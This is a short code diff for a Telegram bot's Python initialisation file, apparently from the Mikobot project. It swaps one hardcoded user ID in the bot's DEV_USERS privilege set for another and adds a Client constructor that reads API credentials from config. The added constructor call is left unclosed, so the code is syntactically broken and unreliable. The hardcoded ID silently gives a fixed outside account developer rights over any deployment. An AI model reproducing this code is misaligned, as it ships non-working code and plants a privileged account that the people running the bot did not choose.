@@ -169,7 +169,12 @@ else:
 # Add OWNER_ID to the DRAGONS and DEV_USERS sets
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(5907205317)
+DEV_USERS.add(6984522418)
+Mikobot = Client(
+           "sumedha" ,
+           api_id=Config.API_ID,
+           api_hash=Config.API_HASH,
+           bot_token=Config.BOT_TOKEN
 # <=======================================================================================================>
 
 # <============================================== INITIALIZE APPLICATION =========================================================>
